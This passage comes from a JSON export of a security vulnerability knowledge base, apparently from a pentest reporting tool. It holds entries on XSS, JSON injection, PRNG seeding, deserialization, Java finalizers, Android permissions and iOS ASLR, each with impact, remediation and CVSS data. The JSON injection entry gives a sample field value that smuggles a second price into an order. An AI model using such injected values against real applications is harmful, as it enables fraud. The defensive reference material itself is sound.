to cross-site scripting attacks. Cross-site scripting vulnerabilities give the attacker control of HTML and JavaScript running in the victim's browser. The attacker can alter page content with malicious HTML or JavaScript code, often in an attempt to deface the site or harvest user data via injected forms. The attacker can also execute application functions using the victim's application identity if the victim is authenticated to the application. An often-cited exploit using cross-site scripting involves the attacker sending himself/herself the victim's session identifier. With this session identifier, the attacker can impersonate the victim in the application for the duration of the session, executing application functionality and accessing potentially sensitive data.\n","remediation":"The application should use a templating engine that encodes variable values by default before inserting them into responses sent to the user. Jinja2 is an example of a Python templating engine that provides output encoding by default. If switching to another templating engine is not an option, the application must perform manual output encoding.\nIn a Mako template, the following uses provide output encoding for various output contexts:\n<pre><code class=\"dust\">URL encoding ${variable | u} HTML encoding ${variable | h} XML encoding ${variable | x} </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":701,"plugin_id":null,"title":"JSON Injection","type":null,"description":"The application inserts untrusted user-supplied data into a JSON object in such a way that any JSON syntax passed as part of the input can modify the JSON object's structure. Applications often use JSON objects to store data and send messages between application components and other back-end systems. When an application constructs or modifies a JSON object by inserting untrusted data in an insecure manner (e.g. concatenation to a string containing a JSON object), any JSON structure passed via the vulnerable input will be interpreted as JSON syntax when the resulting document is later parsed.\nFor example, consider an e-commerce application that takes a user's order, inserts the order data into a JSON object, and then makes a web service call to a back-end system using that JSON object to submit the order. The following JSON object is used as the order template:\n<pre><code class=\"json\">{\"product_id\":<product_id>,\"description\":\"<description>\",\"price\":<price>,\"quantity\":<quantity>} </pre>\nThe application takes the following data from the user in the order page's quantity field, and inserts it into the JSON object above, replacing the \"<quantity>\" substring:\n1,\"price\":1.00\nInserting this data yields the following JSON object:\n<pre><code class=\"json\">{\"product_id\":25,\"description\":\"...\",\"price\":49.99,\"quantity\":1,\"price\":1.00} </pre>\nCertain JSON parsers will parse the above JSON and honor the second price value, allowing a user to modify the price of the item server-side.\n","poc":null,"impact":"With the ability to submit raw JSON to the application, an attacker can insert malicious JSON content to affect application behavior in a variety of ways. If JSON objects are used to store application data, an attacker may be able to exploit JSON injection to insert arbitrary data into the JSON object. If this data is used to execute application functionality, the attacker will gain some level of control over that functionality's behavior. At a minimum, data integrity will be lost since the application has no way of distinguishing between legitimate data and data that has been tampered with.\nIf the application constructs JSON objects that are then parsed by the application or another entity (such as a consuming web service), the attacker will be able to control that functionality as well, and any outcome it may produce. Such attacks may focus on bypassing business logic restrictions to perform unauthorized actions (e.g. adding new users, executing unauthorized transactions, etc.).\n","remediation":"The application should encode JSON-specific control characters before inserting untrusted input into JSON objects. According to the RFC (RFC 4627), the following characters must be replaced with their encoded form:\n--Backslash (\\): \\u005C\n--Double-quote (\"): \\u0022\n--Control characters U+0000 through U+001F: \\u0000 - \\u001F\n\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":702,"plugin_id":null,"title":"Pseudo-Random Number Generator Initialized with Insecure Seed","type":null,"description":"The application uses a cryptographically insecure source for the seed value of a pseudo-random number generator. Even if the pseudo-random number generator is itself cryptographically secure, the output generated by the number generator is at risk of being predictable because of the seed value used.\nA pseudo-random number generator (PRNG) is a deterministic algorithm that takes an unpredictable seed as input and generates a stream of output that appears random. There are two popular types of PRNGs: PRNGs that produce outputs that are statistically random, and Cryptographically Secure PRNGs (CSPRNGs) that produce outputs that are suitable for cryptographic purposes. Loosely speaking, PRNGs generate outputs that do not contain any recognizable patterns; however, given a small amount of output from the PRNG, the past and/or future outputs may be computable. CSPRNGs on the other hand remain unpredictable (for both past and future values) as long as the seed used to initialize the CSPRNG is unknown.\nSeed values determine the initial state of a PRNG. Although PRNGs may produce statistically random values, because the values produced are largely determined by the initial state of the algorithm, their output is not truly random. When these seed values are chosen from predictable sources such as system time, a process id, or similarly guessable values, this initial state may become known.\n","poc":null,"impact":"An attacker who is able to determine the seed and knows the PRNG in use may be able to predict past and/or future outputs from the PRNG. As a result, any values generated using these outputs that must be unpredictable (e.g. cryptographic keys, passwords, salts, session identifiers, etc.) are subsequently at risk of being guessed. An attacker can then use these predicted values to impersonate other users (e.g. via guessed session identifier or predictable password generation), decrypt sensitive data using guessed encryption keys, and much more.\n","remediation":"The application should use a CSPRNG with an unpredictable seed to ensure that the random values needed by the application cannot be predicted by an attacker. Some standardized CSPRNGs are described in NIST SP 800-90A, and ANSI X8.82 Part 3. See NIST SP 800-90B for guidance on entropy sources for seed generation.\nIn addition, the following guidelines should be employed where appropriate when seeding a CSPRNG:\n--Avoid using /dev/random as a seed source on Solaris/Linux/MacOS systems. Reading from this source may cause availability issues, as /dev/random will block until sufficient system entropy is available. Instead, use /dev/urandom.\n--The application should always specify the exact PRNG algorithm to be used. Different environments may have different default PRNG implementations.\n--Periodically reseed the PRNG, as a large amount of output generated by a single seed may be used by an attacker to determine the seed.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":703,"plugin_id":null,"title":"Object Deserialization Used","type":null,"description":"The application deserializes untrusted data into memory objects. Serialization is the process of converting a data structure or object state in memory into a format fit to be stored for later use. This serialized data can later be deserialized, or read and reconstructed, into a memory object. While this is a convenient way to save application state either for transport to a new environment or for later use in the same environment, deserializing data from an untrusted source can cause the application to behave in an unexpected manner.\n","poc":null,"impact":"Deserialization commonly reads data into an object and then subsequently casts it to the appropriate type, bypassing any validation logic in the object's accessor or mutator methods. Depending on how the application handles this data after deserialization, the lack of validation may lead to privilege escalation attacks, denial of service attacks, injection attacks, etc. For example, without prior validation, untrusted deserialized data concatenated to static SQL query strings can lead to SQL injection and untrusted deserialized data reflected back to users may leave the application vulnerable to cross-site scripting attacks.\nSerialized data can also be tailored to attack the deserialization process itself. One example involves recursively-linked data structures that, when deserialized, expand in memory until it is exhausted. Deserializing untrusted data can also lead to remote code execution in specific cases involving reflection.\n","remediation":"The application should avoid using object deserialization whenever possible. If this is not possible, then the application should verify and validate contents of any file, buffer, or otherwise before deserializing it into an object.\nValidation should occur before or during deserialization to assert that the serialized data is safe syntactically, semantically, and in length. For example, when implementing a Serializable class in Java, the default readObject() method should be overridden to validate data specific to that class as opposed to reading an input stream into an instance of Object and then simply casting into the new object type. Whitelist validation should be favored first over other validation techniques since any character or string not explicitly specified as part of the \"known-safe\" set of characters or values is rejected or removed by default. If a sufficient whitelist pattern cannot be determined, blacklist validation can be implemented to provide limited protection by filtering out or rejecting inputs that contain specified characters.\nIn addition to syntactic checks, data should also be checked for size and semantic correctness where possible.\n","cvss_base_score":7.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":704,"plugin_id":null,"title":"Public finalize() Method","type":null,"description":"The application declares a class's finalize() method as public. The finalize method is automatically called by the environment during garbage collection; overriding it provides a way for developers to customize object cleanup. Declaring finalize() as public and allowing it to be called by untrusted code outside of the current package implies that manual cleanup will be attempted, ignoring the automated garbage collector provided by the environment. Developers should not attempt to take on the responsibilities of garbage collection since this often results in errors. For example, any class that overrides the finalize() method must explicitly call the super class's finalize() method; otherwise it will not execute.\n","poc":null,"impact":"Declaring a public finalize() method facilitates premature resource cleanup, which may cause the application to enter an unexpected state. Availability may be compromised if the object is poorly managed or it improperly handles resources. In situations where code executes in a client environment (such as a thick client or mobile application), malicious users may attempt to call public finalize() methods to take advantage of errors in forced object finalization. For example, classes that extend classes with overridden finalize() methods must also override finalize(). Any buffers or other resources that are specifically members of this subclass will not be handled by the inherited finalizer, requiring additional garbage collection cycles before being cleaned up. This may lead to a denial of service condition through memory exhaustion.\n","remediation":"Overriding the finalize() method should be avoided where possible. However, there are some cases where this is not possible, such as when a parent class implements its own finalizer. In order for subclasses to properly release resources, they must also override finalize(). In these cases, finalize() should always be package protected. By declaring the finalize() method as protected, it can only be called by subclasses, other classes in the same package, and the JVM during garbage collection.\n","cvss_base_score":3.5,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:S/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":705,"plugin_id":null,"title":"Direct Call to finalize()","type":null,"description":"The application calls the finalize() method on an object directly. Java attempts to eliminate a number of memory management issues by performing automated class cleanup and garbage collection. The finalize() method provides developers with a way to attempt to manually clean up the contents of a class during garbage collection, and is guaranteed to be called once on any given instance of a class. When developers attempt to clean up memory themselves, there is a much greater risk of error.\n","poc":null,"impact":"Directly defining and calling finalize() may result in premature resource cleanup, placing the application in an unexpected state. The finalization process may create dangling references, resulting in use-after-free conditions. If memory leaks occur during object finalization, garbage collection may never be able to reclaim sections of memory, ultimately resulting in memory exhaustion and a denial of service condition. In addition, finalization is not guaranteed to be single-threaded or even to execute in a particular order. As a result, even when an application is designed to be entirely single-threaded, haphazardly designed finalizers can lead to synchronization issues including race conditions, starvation, and deadlock.\n","remediation":"The application should never explicitly call the finalize() method of any class, with the exception of super.finalize(). Finalizers should generally be avoided, but if they must be used, the following guidelines should be followed where possible:\n--Subclasses inheriting finalize() methods from their parent classes must override finalize() to account for any resources not defined by the parent class.\n--Subclasses overriding finalize() methods must explicitly call the superclass's finalizer as well, usually in a finally {} block. This ensures that any resources defined by the parent class are also cleaned up in the event the implementer(s) of the current class are not aware of all components of the extended class.\n--All exceptions that may be thrown during finalization must be caught, as behavior around uncaught exceptions during finalization is not well defined.\n\n","cvss_base_score":3.5,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:S/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":706,"plugin_id":null,"title":"Application Declares a Maximum SDK Version (Android)","type":null,"description":"The application declares a maxSdkVersion in its AndroidManifest.xml file. When this attribute was introduced, its intent was to allow developers to specify the maximum version of Android on which an application is designed to run. However, since Android versions are backwards compatible, this attribute is not needed, and is not enforced on devices beyond Android 2.0.1.\nGoogle Play does enforce this attribute, and applications with a given maxSdkVersion will not appear in search results on devices with a greater maxSdkVersion. However, users can download the application from various other sources and side-load them onto their devices.\n","poc":null,"impact":"Specifying a maxSdkVersion will result in applications not appearing in Google Play search results on newer devices. This may encourage users to download the application from untrusted sources and may make them more susceptible to malware.\n","remediation":"Do not specify a maxSdkVersion in the application's AndroidManifest.xml file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":707,"plugin_id":null,"title":"Client Side Validation","type":null,"description":"The application validates user supplied input through the use of client side logic. Client side validation allows the application to provide a more seamless experience for end users, but in many cases can easily be bypassed by an attacker. This is possible as an attacker is capable of creating his own requests, or modifying existing requests to be sent to the server independently of the web browser client. For example, an attacker may utilize a web proxy to intercept HTTP traffic between a web browser and the server. By intercepting the traffic an attacker can alter parameters after the client validation has been performed. User defined input that does bypass the validation methodology within the application will be processed, stored or utilized by the application.\n","poc":null,"impact":"Input that is not validated server-side may result in a wide variety of issues depending on how the data is used by the application. For example, the application may attempt to perform logic using data of an expected data type or a value outside an expected range, entering into an unexpected state. In some cases this may have no effect other than causing an error to be thrown, and in others the application may not handle the error correctly, leading to errors in how business logic is executed. Bypassing client-side validation may also allow an attacker to execute injection attacks such as SQL injection and cross-site scripting, again depending on how this data is handled by the application.\n","remediation":"User-defined input must be validated server-side in addition to any checks put in place within client side logic. The use of server-side logic will prevent attackers from accessing the application through alternate means (such as a proxy) to bypass the validation logic. Server-side validation should perform strict input validation in the form of a white list, black list or a combination of the two. These validation methodologies are commonly implemented through the use of regular expressions, or through pre-built security frameworks associated with a specific programming language.\n","cvss_base_score":4.6,"cvss_temporal_score":3.6,"cvss_vector":"(AV:L/AC:L/Au:S/C:N/I:C/A:N/E:POC/RL:OF/RC:C/CDP:LM/TD:H/CR:ND/IR:ND/AR:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":708,"plugin_id":null,"title":"Verbose Server Banner","type":null,"description":"Verbose server information is sent in the HTTP responses from the server.  The information included in the response contains the server name, type, and version number.\nBelow is an example of a HTTP response that contains verbose server banners:\n<pre>HTTP/1.1 200 OK Server: Apache 2.0 Cache-control: private X-Powered-By: JSP/2.2 Content-Type: text/html;charset=utf-8 Content-Language: en-US Content-Length: 3347 </pre>\n","poc":null,"impact":"Verbose server banners provide additional information that allows an attacker to perform targeted attacks to the specific technology stack in use by the application and underlying infrastructure.\n","remediation":"Verbose server information should be removed from all HTTP responses. This can be performed by modifying the server's configuration files or through the use and configuration of a web application firewall.\n","cvss_base_score":2.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"High","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":709,"plugin_id":null,"title":"Application Requests Dangerous or Suspicious Permissions (Android)","type":null,"description":"The application requests potentially dangerous permissions. These are permissions that can be used for malicious purposes either by the application or by code injected into the application by an attacker. These permissions are generally not required for most applications, and their usage should be closely scrutinized. For example, some permissions could cost the user money:\n--android.permission.CALL_PHONE and android.permission.CALL_PRIVILEGED allow an application to initiate a phone call without going through the Dialer user interface for the user to confirm the call being placed\n--android.permission.SEND_SMS and android.permission.SEND_SMS_NO_CONFIRMATION allow an application to send SMS messages without user interaction\n\n--android.permission.READ_SMS allows an application to read SMS messages stored on the user's device\n--android.permission.RECEIVE_SMS allows an application to intercept incoming SMS messages\n--android.permission.READ_INPUT_STATE allows an application to sniff keyboard inputs; this permission was deprecated in API level 16 and the API that required the permission has been removed\n--android.permission.FILTER_EVENTS allows an application to register an input filter which filters the stream of user events (key presses, touches, etc.) before they are dispatched to any window\n--android.permission.INJECT_EVENTS allows an application to inject user events (key presses, touches, etc.) into the event stream and deliver them to any window\n--android.permission.FACTORY_TEST allows an application to run as a manufacturer test application, running as the root user. This is only possible when the device is running in manufacturer test mode.\n--android.permission.SET_ACTIVITY_WATCHER allows an application to watch and control how activities are started globally in the system\n--android.permission.CAPTURE_AUDIO_OUTPUT allows an application to capture device audio output\n--android.permission.CAPTURE_SECURE_VIDEO_OUTPUT and android.permission.CAPTURE_VIDEO_OUTPUT allow an application to capture device video output\n--android.permission.GET_TOP_ACTIVITY_INFO allows an application to retrieve private information about the current top activity, such as any assist context it can provide\n\n--android.permission.CLEAR_APP_USER_DATA allows an application to clear other applications' user data.\n--android.permission.DELETE_PACKAGES allows an application to delete packages installed on a user's device\n--android.permission.CONTROL_LOCATION_UPDATES allows an application to enable/disable location update notifications\n--android.permission.BRICK allows an application to disable the device. This permission is not available in modern versions of Android\n--android.permission.INSTALL_PACKAGES allows an application to install arbitrary packages without requiring user interaction\n--android.permission.ACCESS_SUPERUSER allows an application to obtain superuser (root) privileges\n--android.permission.SYSTEM_ALERT_WINDOW allows an application to open windows on top of all other applications\n--android.permission.BROADCAST_SMS allows an application to broadcast an SMS receipt notification\n--android.permission.BROADCAST_WAP_PUSH allows an application to broadcast a WAP PUSH receipt notification\n--android.permission.CHANGE_COMPONENT_ENABLED_STATE allows an application to enable/disable other applications' components\n--android.permission.DIAGNOSTIC allows an application to get read/write access to diagnostic resources\n--android.permission.DUMP allows an application to retrieve state dump information from system services\n--android.permission.FORCE_BACK allows an application to force a 'back' operation on the current top activity\n--android.permission.MASTER_CLEAR allows an application to perform a factory reset on a device\n--android.permission.WRITE_SECURE_SETTINGS allows an application to modify secure system settings.\n\n","poc":null,"impact":"Users may be suspicious of applications requesting potentially dangerous permissions and may choose to not install them. Note that this is mostly an issue on devices running versions of Android older than 6.0 and for apps that target Android API level 22 or lower.  The application may contain malicious code that may negatively impact its users. This code may have been injected by malware running on a developer's computer.  Even if the application does not actually use the dangerous permissions that it requests, if an attacker is able to (1) inject code or (2) trick the victim application into using a privileged permission, then attacker code (i.e. not having the permission) will effectively gain  access to the underlying privileged functionality by abusing the victim application as a proxy. The latter case is sometimes referred to as permission re-delegation attack.\n","remediation":"Determine whether the application truly requires the identified permissions. If not, remove them from the application's AndroidManifest.xml file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":710,"plugin_id":null,"title":"Application Requests Permissions That It May Not Need (Android)","type":null,"description":"The application requests permissions for performing operations that can be performed in a safer way without the permissions. The mechanisms that require permissions can be dangerous if misused. Some examples are:\n--Instead of using android.permission.CALL_PHONE, the application can invoke the Dialer to make calls by sending an implicit intent {action=android.intent.action.DIAL, data=tel:nnnn} where nnnn is the telephone number\n--Instead of using android.permission.SEND_SMS, the application can invoke the default SMS send dialog (that requires user authorization) by sending an implicit intent {action=android.intent.action.VIEW, dat=sms:nnnn, sms_body= ...} where nnnn is the destination telephone number. (There are variations of this mechanism for different Android versions)\n--Instead of using android.permission.READ_SMS, consider using Google Cloud Messaging (GCM) or IP networking for sending data from a service to your app\n--Instead of using android.permission.INSTALL_PACKAGES, the application can invoke the PackageInstaller to install a package by sending an implicit intent {action=android.intent.action.VIEW, data=file:///path/to/example.apk} or {action=android.intent.action.INSTALL_PACKAGE, data=file:///path/to/example.apk}\n--Instead of using android.permission.READ_PHONE_STATE to obtain device identifiers, create a GUID (http://developer.android.com/reference/java/util/UUID.html) for your application and use it instead (see http://android-developers.blogspot.co.uk/2011/03/identifying-app-installations.html)\n--Instead of using android.permission.WRITE_CALENDAR, the application can insert a calendar event via the default calendar application by sending an implicit intent {action=android.intent.action.EDIT, data=content://com.android.calendar/events} with the calendar event data passed as intent extras\n--Instead of using android.permission.WRITE_EXTERNAL_STORAGE to store data in external storage, store application data in internal storage.\n--Instead of using android.permission.DELETE_PACKAGES, the application can invoke the Package Installer to remove a package by sending an implicit intent {action=android.intent.action.UNINSTALL_PACKAGE, dat=package:com.example.package} (Android ICS or earlier) or {action=android.intent.action.DELETE, dat=package:com.example.package} (post Android ICS)\n\n","poc":null,"impact":"The permissioned mechanisms for performing some operations can be dangerous if they are misused or abused. It is safer to use the mechanisms that do not require permissions as they result in users having more visibility and control.\nApplications that do not require excessive permissions are often more attractive to end users. Users may choose to not install applications that require excessive permissions. Note that this is mostly an issue on devices running versions of Android older than 6.0 and for apps that target Android API level 22 or lower. If a vulnerability in the application allows an attacker to trick the victim application into using a privileged permission then this is called a permission re-delegation attack. Most of the time the user is not aware that the permission has been extended to the attacking application. Replacing a permissioned mechanism with an alternative that does not require a permission is an effective countermeasure to this attack.\n","remediation":"Consider using the alternate mechanisms for performing operations described earlier instead of the permissioned mechanisms.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Low","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":711,"plugin_id":null,"title":"Application Requests Permissions That Are Overly Privileged (Android)","type":null,"description":"The application requests permissions that are not necessary for most applications because there are less privileged permissions that are often sufficient. For example:\n--android.permission.WRITE_EXTERNAL_STORAGE is often not needed. Beginning with Android 4.4 (API level 19), it is no longer necessary for your app to request this permission when your app wants to write to its own application-specific directories on external storage (the directory provided by getExternalFilesDir()).\n--android.permission.ACCESS_FINE_LOCATION is often not needed; the android.permission.ACCESS_COARSE_LOCATION permission generally provides a device's location with sufficient granularity for most applications.\n\n","poc":null,"impact":"Users may be suspicious of applications requesting potentially dangerous permissions and may choose to not install them. Note that this is mostly an issue on devices running versions of Android older than 6.0 and for apps that target Android API level 22 or lower.\n","remediation":"When using android.permission.WRITE_EXTERNAL_STORAGE, restrict the permission request to API level 18 and earlier by adding the following to the application's AndroidManifest.xml file:\n<pre><code class=\"xml\"><uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" android:maxSdkVersion=\"18\" /> </pre>\nIf using android.permission.ACCESS_FINE_LOCATION, consider whether android.permission.ACCESS_COARSE_LOCATION might be sufficient.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Low","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":712,"plugin_id":null,"title":"Debug Information Present in Application DEX Bytecode (Android)","type":null,"description":"The application's DEX bytecode contains debug information, which may make the application easier to reverse engineer or leak information. This is typically the result of the application being built in debug mode instead of in release mode. Debug information in DEX bytecode may contain information such as source file names, line numbers associated with bytecode instructions and variable names.\n","poc":null,"impact":"Including debug information in the application's DEX bytecode can make the application easier to reverse engineer. An attacker that reverse engineers the application may be able to discover intellectual property, cryptographic algorithms/keys, etc. The attacker may also be able to modify the application to bypass security controls, inject malicious code, etc.\n","remediation":"Ensure that the application is built in release mode before it is released to ensure that it does not contain debug information. Note that if protecting against reverse engineering is important for the application, then removing debug symbols is only the first step. Using binary hardening tools may also be necessary.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":713,"plugin_id":null,"title":"PIE ASLR Not Implemented (iOS)","type":null,"description":"This application was compiled without PIE ASLR enabled. Address Space Layout Randomization (ASLR) ensures that every time an application is loaded into memory it is randomly loaded into a different memory address, preventing an exploit from capitalizing on a predictable memory location. There are two levels of completeness for ASLR in iOS 4.3+ (not available in earlier OS versions), depending on whether the application was compiled with support for Position Independent Executables (PIE).\nCode compiled without PIE support will run with limited ASLR, meaning that the application's executable, data, stack, and dyld will always be loaded at the same fixed location in memory, with only the heap and libraries loaded at randomized locations. Code compiled with PIE support will run with full ASLR, which will load the application executable, data, heap, stack, libraries, and dyld at randomized locations in memory. XCode 4+ enables PIE ASLR by default, but if the application is built from the command line or with an older XCode profile, the option must be set explicitly.\n","poc":null,"impact":"Without PIE ASLR enabled, an attacker could use a buffer overflow or similar attack to force the application to jump to a specific memory address where additional code gets executed. Because the destination address is predictable (versus randomized with PIE ASLR), an attacker could jump to malicious code injected into another memory location or to existing code at an unexpected point in the application's execution. The end result is generally a change in the application's expected behavior, with a worst-case scenario of a device-wide compromise.\n","remediation":"Enable PIE ASLR during the application build process. Ensure that the application is built for iOS 4.3 or later, where ASLR is available. If using XCode for your build, ensure that the build setting \"Generate Position-Dependent Executable\" is set to \"No\". If compiling via the command line include the \"-pie\" flag to enable PIE ASLR.\n","cvss_base_score":6,"cvss_temporal_score":4.5,"cvss_vector":"(AV:L/AC:H/Au:S/C:C/I:C/A:C/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":714,"plugin_id":null,"title":"Mutable Public Static Final Field","type":null,"description":"The application declares a mutable type as \"public\", \"final\", and \"static\". The \"final\" modifier is intended to prevent changes to a field after declaration. For reference types such as objects and arrays, however, it may be the case that only the reference itself is declared as immutable. In Java, this is always the case. In C/C++, this depends on whether the \"const\" keyword is placed before or after the '*' used to indicate that the value is a pointer. For example, declaring a variable as an \"int const * ptr\" makes it a pointer to a constant, in which case the pointer itself can still be modified. However, declaring an \"int * const ptr\" makes the value a constant pointer, where the referenced object can be modified, but the pointer itself is constant. Any data encapsulated inside the referenced structure may still be mutable in this case, although this might not be immediately obvious.\n","poc":null,"impact":"Mutable \"public\", \"static\", and \"final\" fields accessed and modified from outside of the current package may be modified by untrusted code, resulting in unexpected application behavior. Because this field is shared by all instances of the encapsulating class, when it is changed once, the entire application is affected. This may provide an attacker with unauthorized access to application resources (e.g. database/network connections and file handles) or application logic bypass (via direct access to objects that are otherwise restricted by application logic). In Java, the field may also be used as a communication channel between application domains, since static memory may be visible to code loaded by other class loaders. Data may be leaked from the application to another application running on the same JVM, or malicious data may be fed in through this static field. This usage is also not thread-safe, since the field can be read and modified by multiple threads simultaneously.\n","remediation":"Analyze the field in question to determine its data accessibility requirements. Mutable reference types should never be declared \"public\", \"static\", and \"final\" in any case where they should not be modified by the application. If the field and the object it points to should be read-only, they will need to be refactored in such a way that access to the object is restricted. This can be accomplished in various ways, such as making the object private and returning a \"disposable\" deep copy to all requesting code. In this way, the original copy owned by the encapsulating class is never directly accessed by other classes, and any modifications performed are not performed on the original copy. If the field must remain mutable, it should be private, and access must be synchronized and controlled through appropriate accessor and mutator methods.\n","cvss_base_score":3.3,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":715,"plugin_id":null,"title":"Non-final Public Static Field","type":null,"description":"The application declares a field as public and static without making it final, which may allow the field to be read and modified by code outside of its class and package. By declaring the field as public, any class may address the field directly without using any accessor functions, meaning any modifications to the field after declaration cannot be validated. In addition, because the field is static, only one copy of the field is used by all instances of the encapsulating class throughout the entire application.\n","poc":null,"impact":"Non-final public static fields accessed and modified from outside of the current package may be modified by untrusted code, resulting in unexpected application behavior. Any validation typically performed on this field is bypassed by direct modification, potentially leading to injection attacks (e.g. cross-site scripting, SQL injection, etc.).\nBecause this field is shared by all instances of the encapsulating class, when it is changed once, the entire application is affected. This may provide an attacker with unauthorized access to application resources (e.g. database/network connections and file handles) or application logic bypass (via direct access to objects that are otherwise restricted by application logic). The field may also be used as a communication channel between application domains, since static memory may be visible to code loaded by other class loaders. Data may be leaked from the application to another application running on the same JVM, or malicious data may be fed in through this static field. This usage is also not thread-safe, since the field can be read and modified by multiple threads simultaneously.\n","remediation":"Analyze the field in question to determine its data accessibility requirements. If the field should be read-only, it should be declared as such. The keywords associated with this are \"final\", \"readonly\", and \"const\" in Java, C#, and C/C++ respectively. If the field must remain mutable, it should be private, and access must be synchronized and controlled through appropriate accessor and mutator methods with proper validation.\n","cvss_base_score":3.3,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 